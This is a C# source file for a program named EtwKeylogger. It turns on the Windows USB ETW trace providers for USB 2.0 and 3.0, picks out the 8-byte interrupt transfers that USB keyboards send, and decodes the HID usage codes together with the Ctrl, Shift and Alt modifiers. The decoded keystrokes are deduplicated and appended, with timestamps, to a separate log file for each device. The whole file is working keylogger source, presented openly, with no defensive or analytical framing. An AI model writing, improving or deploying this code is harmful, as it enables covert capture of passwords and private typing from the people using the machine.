using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using Microsoft.Diagnostics.Tracing;
using Microsoft.Diagnostics.Tracing.Session;
using System.Threading.Tasks;

namespace EtwKeylogger
{
    public class UsbData
    {
        public byte[] data;
        public ulong hndl;
        public DateTime time;

        public UsbData(DateTime inputTime, ulong inputHndl, byte[] inputData)
        {
            time = inputTime;
            data = inputData;
            hndl = inputHndl;
        }
    }

    public class UsbEventSource
    {
        // Microsoft-Windows-USB-UCX (usb3.0)
        private static Guid UsbUcx = new Guid("36DA592D-E43A-4E28-AF6F-4BC57C5A11E8");
        // Microsoft-Windows-USB-USBPORT (usb2.0)
        private static Guid UsbPort = new Guid("C88A4EF5-D048-4013-9408-E04B7DB2814A");

        private static string sessionName = "UsbKeylog";
        private static string dumpPath = Directory.GetCurrentDirectory() + "\\logs";

        private static Queue<UsbData> datastore = new Queue<UsbData>();
        private static HashSet<ulong> badHndls = new HashSet<ulong>();

        public static void StartCapture(string newSessionName = null)
        {
            if (newSessionName != null)
                sessionName = newSessionName;

            using (var session = new TraceEventSession(sessionName))
            {
                if (TraceEventSession.IsElevated() != true)
                {
                    Console.Out.WriteLine("[!] run as admin");
                    return;
                }
                SetupCtrlCHandler(() => { if (session != null) session.Stop(); });
                session.Source.Dynamic.All += EventCallback;
                session.EnableProvider(UsbUcx);
                session.EnableProvider(UsbPort);
                Console.WriteLine("starting capture ...");
                session.Source.Process();
            }
        }

        private static Dictionary<string, string> _expose(object hidden)
        {
            char[] separators = { '{', '}', ',' };
            char[] remove = { ' ', '"' };
            string[] s = hidden.ToString().Split(separators, StringSplitOptions.RemoveEmptyEntries);
            Dictionary<string, string> item = s.ToDictionary(x => x.Split('=')[0].Trim(), x => x.Split('=')[1].Trim(remove));
            return item;
        }

        private static object GetItem(TraceEvent eventData, string item)
        {
            object value = null;
            int pIndex = eventData.PayloadIndex(item);
            if (pIndex < 0)
                return value;

            try
            {
                value = eventData.PayloadValue(pIndex);
            }
            catch (ArgumentOutOfRangeException) {}

            return value;
        }

        private static ulong FilterUsb2(TraceEvent eventData)
        {
            ulong hndl;
            object field;

            field = GetItem(eventData, "fid_USBPORT_Device");
            Dictionary<string, string> deviceInfo = _expose(field);

            if (!ulong.TryParse(deviceInfo["DeviceHandle"], out hndl) && hndl <= 0)
                return 0;

            field = GetItem(eventData, "fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER");
            Dictionary<string, string> urb = _expose(field);

            int xferDataSize = 0;
            if (!int.TryParse(urb["fid_URB_TransferBufferLength"], out xferDataSize))
                return 0;

            // bug in traceevent (v1.0.41) parsing of USBPORT (usb2.0) urb data
            //  this should be size 8 (according to microsoft message analyzer)
            //  instead it is returned as size 34
            if (xferDataSize != 34)
                return 0;

            return hndl;
        }

        private static ulong FilterUsb3(TraceEvent eventData)
        {
            ulong hndl = (ulong)GetItem(eventData, "fid_PipeHandle");
            if (hndl <= 0)
                return 0;

            // retrieve raw urb data
            object field = GetItem(eventData, "fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER");
            Dictionary<string, string> urb = _expose(field);

            // xfer buffer length is last n-bytes in eventData
            int xferDataSize = 0;
            if (!int.TryParse(urb["fid_URB_TransferBufferLength"], out xferDataSize))
                return 0;

            // usb keyboard xfer data is 8 bytes
            if (xferDataSize != 8)
                return 0;

            return hndl;
        }

        // EventCallback - performs the following filtering of trace event data
        //  1: check if there are any traceevent data
        //  --- filter for usb2 or usb3 device (different urb fields)
        //  2: check for usb bulk/interrupt transfers
        //  3: check for designated non-zero handle for usb device
        //  4: check for successful retrieval of urb data
        //  --- parse urb data structure
        //  5: check for successful parse of urb xfer buffer length
        //  6: check xfer buffer length matches keyboard size
        //  7: check that reserved byte is unused
        //  8: check for non-empty keyboard data
        //  9: check for out of order data
        // 10: check for key rollover error
        private static void EventCallback(TraceEvent eventData)
        {
            ulong hndl = 0;
            if (eventData.EventDataLength <= 0)
                return;

            if (eventData.PayloadNames.Contains("fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER"))
                hndl = FilterUsb2(eventData);
            else if (eventData.PayloadNames.Contains("fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER"))
                hndl = FilterUsb3(eventData);
            else
                return;

            if (hndl == 0)
                return;

            byte[] xferData = new byte[8];
            Array.Copy(eventData.EventData(), eventData.EventDataLength - 8, xferData, 0, 8);

            // ignore reserved fields for keyboards
            //  byte[1] must always be 0
            if (xferData[1] != 0)
                return;

            // byte[2] to byte[8] contains standard keystrokes
            if (xferData.Skip(2).SequenceEqual(new byte[6] { 0, 0, 0, 0, 0, 0 }))
                return;

            // if any byte[i] has 0, then following bytes must be 0
            for (int i = 2; i < 8; i++)
            {
                if (xferData[i] == 0)
                    for (int j = i; j < 6; j++)
                        if (xferData[j] != 0)
                            return;
            }
            
            // keyboard rollover error
            if (xferData.Skip(2).SequenceEqual(new byte[6] { 1, 1, 1, 1, 1, 1 }))
                return;

            datastore.Enqueue(new UsbData(eventData.TimeStamp, hndl, xferData));
        }

        private static bool isCtrlCExecuted;
        private static ConsoleCancelEventHandler ctrlCHandler;
        private static void SetupCtrlCHandler(Action action)
        {
            isCtrlCExecuted = false;
            if (ctrlCHandler != null)
                Console.CancelKeyPress -= ctrlCHandler;

            ctrlCHandler = (object sender, ConsoleCancelEventArgs cancelArgs) =>
            {
                if (!isCtrlCExecuted)
                {
                    isCtrlCExecuted = true;
                    Console.WriteLine("terminating ...");
                    action();
                    cancelArgs.Cancel = true;
                }
            };
            Console.CancelKeyPress += ctrlCHandler;
        }

        private static string[] ParseKeys(byte[] bytes)
        {
            string[] result = new string[2];
            result[0] = BitConverter.ToString(bytes).Replace("-", " ");

            // modifiers:
            //  CTL = 1
            //  SFT = 2
            //  ALT = 4
            byte modByte = bytes[0];
            byte noneByte = bytes[1];

            byte[] dataBytes = new byte[6];
            Array.Copy(bytes, 2, dataBytes, 0, 6);

            string[] fullKeyStroke = new string[6];

            // convert usageId -> usageName
            for (int i = 0; i < fullKeyStroke.Length; i++)
            {
                int usageId = dataBytes[i];
                string[] key = KeyMap.GetKey(usageId);

                // skip unmapped data
                if (key == null)
                    return null;

                // empty data (usageId == 0)
                if (key.SequenceEqual(new string[1]))
                {
                    fullKeyStroke[i] = "";
                    continue;
                }

                // [SFT]
                if ((modByte & 0x02) != 0)
                    fullKeyStroke[i] = key.Last();
                else
                    fullKeyStroke[i] = key.First();
            }

            string parsed = "";
            if ((modByte & 0x01) != 0)
                parsed += "[CTL] ";
            if ((modByte & 0x04) != 0)
                parsed += "[ALT] ";
            parsed += String.Join(" ", fullKeyStroke);
            result[1] = parsed.Trim();

            return result;
        }

        private static void DumpKeys()
        {
            if (!Directory.Exists(dumpPath))
                Directory.CreateDirectory(dumpPath);

            List<UsbData> history = new List<UsbData>();

            string[] result;
            UsbData usb;
            while(datastore.Count > 0)
            {
                usb = datastore.Dequeue();
                if (badHndls.Contains(usb.hndl))
                    continue;

                // deduplicate keystrokes based on a sliding window
                double threshold = 160;
                if (history.Count > 0)
                {
                    HashSet<byte> duplicateBytes = new HashSet<byte>();
                    List<UsbData> staleHistory = new List<UsbData>();

                    double newTime = usb.time.TimeOfDay.TotalMilliseconds;

                    // create a set of keys used by historical usb event data
                    //  if data is deemed old, add to a staleHistory list
                    //  for later pruning.
                    foreach (UsbData usbOld in history)
                    {
                        double oldTime = usbOld.time.TimeOfDay.TotalMilliseconds;

                        if (newTime - oldTime > threshold)
                        {
                            staleHistory.Add(usbOld);
                            continue;
                        }

                        for (int i = 2; i < 8; i++)
                            duplicateBytes.Add(usbOld.data[i]);
                    }

                    foreach (UsbData stale in staleHistory)
                        history.Remove(stale);

                    history.Add(usb);

                    // zeroize duplicate bytes
                    foreach (byte b in duplicateBytes)
                    {
                        if (b != 0 && usb.data.Contains(b))
                        {
                            int pos = Array.IndexOf(usb.data, b);
                            usb.data[pos] = 0;
                        }
                    }

                    // skip empty data, as a result of deduplication
                    if (usb.data.Skip(2).SequenceEqual(new byte[6] { 0, 0, 0, 0, 0, 0 }))
                        continue;
                }
                else
                {
                    history.Add(usb);
                }

                result = ParseKeys(usb.data);

                // blacklist usb device which generates bad data
                if (result == null)
                {
                    Console.WriteLine("[!] ignoring non-usb keyboard device: 0x{0:X}", usb.hndl);
                    badHndls.Add(usb.hndl);
                    continue;
                }

                string output = String.Join("\t\t", result).Trim();
                string dt = usb.time.ToString("yyyyMMdd hh:mm:ss.fff");
                string path = Path.Combine(dumpPath, String.Format("0x{0:X}", usb.hndl) + ".txt");

                Console.WriteLine("{0}\t{1}", dt, output);
                using (StreamWriter file = File.AppendText(path))
                    file.WriteLine("{0}\t{1}", dt, output);
            }
        }

        private static async void StartDumpKeys()
        {
            while (true)
            {
                DumpKeys();
                await Task.Delay(100);
            }
        }

        public static void Main(string[] args)
        {
            string session = null;
            if (args.Length > 0)
                session = args[0];

            StartDumpKeys();
            StartCapture(session);
        }
    }
}